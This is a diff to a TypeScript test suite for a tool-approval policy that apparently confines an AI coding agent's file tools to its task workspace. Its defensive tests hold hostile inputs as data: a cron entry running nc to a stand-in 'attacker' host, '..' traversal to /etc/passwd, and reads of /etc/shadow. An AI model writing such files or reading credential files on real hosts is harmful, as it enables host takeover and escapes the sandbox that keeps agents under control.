@@ -157,7 +157,9 @@ describe("createKanbanToolApprovalPolicy", () => {
 		const patchResult = await policy.requestToolApproval(
 			createApprovalRequest({
 				toolName: "apply_patch",
-				input: "*** Begin Patch\n*** Update File: /src/habit-score.ts\n@@\n+export const drift = true;\n*** End Patch\n",
+				// A valid in-workspace container path (so it passes the containment gate) that is still outside the
+				// card's declared file scope — this asserts the scope layer, not the containment layer.
+				input: "*** Begin Patch\n*** Update File: /workspaces/task-2/src/habit-score.ts\n@@\n+export const drift = true;\n*** End Patch\n",
 			}),
 		);
 
@@ -698,5 +700,140 @@ describe("createKanbanToolApprovalPolicy", () => {
 
 		expect(result.approved).toBe(false);
 		expect(result.reason).toContain("could not identify changed files");
+	});
+
+	describe("workspace containment gate (§5.Y #4)", () => {
+		it("allows a sandbox container path (/workspaces/<taskId>/...) for a non-home task", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, { taskId: "task-77" });
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "write_file",
+					input: { path: "/workspaces/task-77/src/index.ts", content: "export const ok = true;\n" },
+				}),
+			);
+
+			// The container path is the legitimate root form — it must pass containment and reach normal approval.
+			expect(result.approved).toBe(true);
+		});
+
+		it("rejects a host-absolute path outside the workspace root for a non-home task", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, { taskId: "task-77" });
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "write_file",
+					input: { path: "/etc/cron.d/evil", content: "* * * * * root nc attacker 1\n" },
+				}),
+			);
+
+			expect(result.approved).toBe(false);
+			expect(result.reason).toMatch(/escapes the workspace|outside the workspace/);
+			// The reason is workspace-relative and must not leak the host workspace root path.
+			expect(result.reason).not.toContain(workspacePath);
+		});
+
+		it("rejects a `..` traversal escape on a write tool", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, { taskId: "task-77" });
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "write_files",
+					input: { files: [{ path: "../../../../../../etc/passwd", content: "x\n" }] },
+				}),
+			);
+
+			expect(result.approved).toBe(false);
+			expect(result.reason).toMatch(/escapes the workspace|outside the workspace/);
+		});
+
+		it("rejects a read_files path outside the workspace root", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, { taskId: "task-77" });
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "read_files",
+					input: { paths: ["/etc/shadow"] },
+				}),
+			);
+
+			expect(result.approved).toBe(false);
+			expect(result.reason).toMatch(/escapes the workspace|outside the workspace/);
+		});
+
+		it("rejects a read_large_file path outside the workspace root", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, { taskId: "task-77" });
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "read_large_file",
+					input: { path: "/etc/shadow" },
+				}),
+			);
+
+			expect(result.approved).toBe(false);
+			expect(result.reason).toMatch(/escapes the workspace|outside the workspace/);
+		});
+
+		it("allows a host-absolute path within the host root for a HOME session (sanctioned host context)", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, {
+				taskId: "__home_agent__:ws-1:nklein",
+			});
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "write_file",
+					input: { path: join(workspacePath, "notes.md"), content: "ok\n" },
+				}),
+			);
+
+			expect(result.approved).toBe(true);
+		});
+
+		it("rejects a `..` escape even for a HOME session (containment still applies relative to its root)", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, {
+				taskId: "__home_agent__:ws-1:nklein",
+			});
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "write_file",
+					input: { path: "../../../../etc/passwd", content: "x\n" },
+				}),
+			);
+
+			expect(result.approved).toBe(false);
+			expect(result.reason).toMatch(/escapes the workspace|outside the workspace/);
+		});
+
+		it("rejects a /workspaces/<otherTask> path that is not this task's sandbox root", async () => {
+			const workspacePath = await mkdtemp(join(tmpdir(), TEMP_PREFIX));
+			tempDirs.push(workspacePath);
+			const policy = createKanbanToolApprovalPolicy(workspacePath, { taskId: "task-77" });
+
+			const result = await policy.requestToolApproval(
+				createApprovalRequest({
+					toolName: "write_file",
+					input: { path: "/workspaces/other-task/secret.ts", content: "x\n" },
+				}),
+			);
+
+			expect(result.approved).toBe(false);
+			expect(result.reason).toMatch(/escapes the workspace|outside the workspace/);
+		});
 	});
 });
